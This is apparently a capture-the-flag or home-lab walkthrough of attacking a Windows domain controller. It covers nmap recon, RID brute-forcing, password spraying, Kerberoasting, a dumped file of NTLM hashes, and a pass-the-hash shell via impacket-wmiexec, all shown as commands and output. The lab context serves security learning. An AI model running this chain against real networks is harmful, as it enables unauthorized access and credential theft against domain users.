
# recon 

let's get to it 
target - > 192.168.0.112
```bash
#nmap 
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-19 12:13:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:61:4D:0F (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 080027614d0f (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2024-08-19T12:14:12
|_  start_date: N/A
|_clock-skew: 6h59m56s
```

```sql
	DC01            <20> -         B <ACTIVE>  File Server Service
	DC01            <00> -         B <ACTIVE>  Workstation Service
	SOUPEDECODE     <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	SOUPEDECODE     <1c> - <GROUP> B <ACTIVE>  Domain Controllers
	SOUPEDECODE     <1b> -         B <ACTIVE>  Domain Master Browser
```

```sql 
smbclient -L ///192.168.0.112// 
Password for [WORKGROUP\m1cr0]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.0.112 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
```

shares cannot be access `Users and backup` 
`SMB         192.168.0.112   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 

run this to get username 
`nxc smb 192.168.0.112 -u guest -p "" --rid-brute  | tee nxc-rid.txt`

then tries users against usernames
`
```sql 
┌─[m1cr0@veric]─[~/Desktop/HMV/dc1]
└──╼ $ls
nxc-rid.txt  scan.md  users.txt
┌─[m1cr0@veric]─[~/Desktop/HMV/dc1]
└──╼ $nxc smb 192.168.0.112 -u users.txt -p users.txt --no-brute 
SMB         192.168.0.112   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:Administrator STATUS_LOGON_FAILURE
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\DC01$:DC01$ STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\bmark0:bmark0 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\otara1:otara1 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\kleo2:kleo2 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\eyara3:eyara3 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\pquinn4:pquinn4 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\jharper5:jharper5 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\bxenia6:bxenia6 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\gmona7:gmona7 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\oaaron8:oaaron8 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\pleo9:pleo9 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\evictor10:evictor10 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\bgavin12:bgavin12 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\ndelia13:ndelia13 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\akevin14:akevin14 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\kxenia15:kxenia15 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\ycody16:ycody16 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\qnora17:qnora17 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\dyvonne18:dyvonne18 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\qxenia19:qxenia19 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\rreed20:rreed20 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\icody21:icody21 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\ftom22:ftom22 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\ijake23:ijake23 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\rpenny24:rpenny24 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\jiris25:jiris25 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\colivia26:colivia26 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\pyvonne27:pyvonne27 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\zfrank28:zfrank28 STATUS_LOGON_FAILURE 
SMB         192.168.0.112   445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
```

got a valid one `ybob317:ybob317`
lets use that and connect smbshares 
run GetUserSPNS get the ticket hashes crack them 
```
file_svc:Password123!!
```

## SMB 

`smbclient  \\\\192.168.0.112\\\backup -U 'file_svc%Password123!!'`

```sql
smb: \> dir
  .                                   D        0  Mon Jun 17 18:41:17 2024
  ..                                 DR        0  Mon Jun 17 18:44:56 2024
  backup_extract.txt                  A      892  Mon Jun 17 09:41:05 2024

		12942591 blocks of size 4096. 10878616 blocks available
smb: \> get backup_extract.txt 
getting file \backup_extract.txt of size 892 as backup_extract.txt (18.9 KiloBytes/sec) (average 18.9 KiloBytes/sec)
smb: \> 
```

cat backup_extract.txt 

```sql
┌─[m1cr0@veric]─[~/Desktop/HMV/dc1]
└──╼ $cat backup_extract.txt 
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
┌─[m1cr0@veric]─[~/Desktop/HMV/dc1]
└──╼ $cat backup_extract.txt | cut -d ":" -f 1 > cool_users.txt
┌─[m1cr0@veric]─[~/Desktop/HMV/dc1]
└──╼ $cat backup_extract.txt | cut -d ":" -f 4 > ntlm_hash.txt
┌─[m1cr0@veric]─[~/Desktop/HMV/dc1]
└──╼ $
```

```bash
┌─[✗]─[m1cr0@veric]─[~/Desktop/HMV/dc1]
└──╼ $nxc smb 192.168.0.112 -u cool_users.txt -H ntlm_hash.txt --no-brute
SMB         192.168.0.112   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\WebServer$:c47b45f5d4df5a494bd19f13e14f7902 STATUS_LOGON_FAILURE
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE
SMB         192.168.0.112   445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE
SMB         192.168.0.112   445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

now lets used the Pwned hash and login 

```sql 
┌─[✗]─[m1cr0@veric]─[~/Desktop/HMV/dc1]
└──╼ $impacket-wmiexec 'SOUPEDECODE.LOCAL/FileServer$@192.168.0.112' -hashes :e41da7e79a4c76dbd9cf79d1cb325559
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
# username 
C:\Users\ybob317>cd Desktop
C:\Users\ybob317\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is CCB5-C4FB

 Directory of C:\Users\ybob317\Desktop

06/17/2024  10:45 AM    <DIR>          .
06/17/2024  10:24 AM    <DIR>          ..
06/12/2024  04:54 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  44,557,017,088 bytes free

C:\Users\ybob317\Desktop>type user.txt
6bab1f09a7403980bfeb4c2b412be47b
C:\Users\ybob317\Desktop>

```